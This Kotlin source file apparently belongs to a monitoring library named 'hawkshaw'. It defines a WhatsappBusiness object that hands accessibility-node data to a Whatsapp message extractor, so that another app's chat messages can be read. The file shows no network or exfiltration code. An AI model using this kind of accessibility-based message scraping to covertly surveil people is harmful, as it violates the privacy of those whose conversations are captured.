package com.hawkshaw.library.features.accessibility.socialmedia

import android.os.Build
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import java.util.concurrent.ExecutorService

/**
 * Object responsible for extracting WhatsApp Business messages from accessibility events
 * Delegates to the Whatsapp class since the UI structure is identical
 */
object WhatsappBusiness {
    
    /**
     * Extracts and processes WhatsApp Business messages from the provided accessibility node
     * by delegating to the Whatsapp extractor
     * 
     * @param source The accessibility node containing WhatsApp Business message information
     * @param executor The executor service for handling background tasks
     */
    @RequiresApi(Build.VERSION_CODES.O)
    fun extractMessages(source: AccessibilityNodeInfo, executor: ExecutorService) {
        Whatsapp.extractMessages(source, executor)
    }
} 